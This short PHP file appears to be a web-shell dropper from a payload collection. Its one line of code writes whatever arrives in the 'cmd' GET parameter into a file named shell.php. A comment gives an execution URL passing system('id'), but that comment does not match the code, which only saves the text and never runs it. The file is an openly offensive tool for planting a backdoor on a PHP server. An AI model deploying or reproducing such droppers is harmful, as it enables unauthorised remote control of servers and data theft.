# This will only work if the file_put_contents() function is enabled and not disabled in the PHP configuration.
# Execution: http://example.com/webshell_file_put_contents.php?cmd=system('id')

<?php file_put_contents("shell.php", $_GET['cmd']); ?>